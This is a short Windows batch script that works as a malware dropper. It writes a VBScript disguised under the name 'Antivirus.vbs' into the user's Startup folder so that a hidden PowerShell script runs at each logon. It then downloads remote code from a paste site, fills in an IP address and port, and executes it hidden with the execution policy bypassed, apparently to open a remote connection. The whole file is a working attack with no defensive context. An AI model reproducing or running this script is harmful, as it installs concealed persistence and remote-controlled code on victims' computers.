@echo off
cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo Set oShell = CreateObject ("Wscript.Shell") >> Antivirus.vbs
echo Dim strArgs >> Antivirus.vbs
echo strArgs = "cmd /c cd %temp% && powershell -executionpolicy bypass -window hidden -file .\temp.ps1" >> Antivirus.vbs
echo oShell.Run strArgs, 0, false >> Antivirus.vbs
cd %temp%
echo $1=(new-object Net.WebClient).DownloadString('https://paste.ee/r/bQ0Rh') >> source.ps1
echo $2=$1 -replace '_ipaddress_' , '_ipbat_' >> source.ps1
echo $3=$2 -replace '_port_' , '_portbat_' ^| out-file temp.ps1 >> source.ps1
echo powershell -executionpolicy bypass -window hidden -file temp.ps1 >> source.ps1
powershell -executionpolicy bypass -window hidden -file source.ps1
